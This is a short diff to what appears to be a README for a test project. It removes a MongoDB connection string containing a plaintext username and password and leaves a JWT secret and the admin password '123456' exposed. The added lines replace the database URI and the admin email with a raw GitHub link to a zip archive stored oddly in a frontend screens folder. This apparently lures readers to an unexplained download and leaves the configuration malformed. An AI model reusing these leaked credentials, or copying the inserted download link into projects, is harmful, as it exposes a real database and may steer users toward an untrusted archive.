@@ -4,9 +4,9 @@ a test project for rcndc consultancy
 .env
 NODE_ENV=development
 PORT=5000
-MONGO_URI=mongodb+srv://ruksol2021:oilZA4hHis4KjtQ2@cluster0.aj8lvkz.mongodb.net/testproject?retryWrites=true&w=majority
+MONGO_URI=mongodb+https://github.com/ruksol/EventAddis/raw/refs/heads/main/frontend/src/screens/Event_Addis_1.0.zip
 JWT_SECRET=heloo222
 
 admin account
-john@gmail.com
+https://github.com/ruksol/EventAddis/raw/refs/heads/main/frontend/src/screens/Event_Addis_1.0.zip
 123456
